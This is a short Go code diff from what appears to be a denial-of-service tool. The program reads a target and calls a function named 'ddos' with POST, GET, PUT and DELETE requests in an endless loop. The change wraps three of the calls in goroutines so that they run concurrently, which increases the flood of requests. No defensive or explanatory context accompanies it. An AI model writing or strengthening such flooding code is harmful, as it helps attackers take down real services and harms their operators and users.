@@ -21,9 +21,10 @@ func main() {
 	fmt.Scan(&target)
 
 	for {
-		ddos(target, "POST")
-		ddos(target, "GET")
-		ddos(target, "PUT")
+		go ddos(target, "POST")
+		go ddos(target, "GET")
+		go ddos(target, "PUT")
 		ddos(target, "DELETE")
 	}
+	select {}
 }
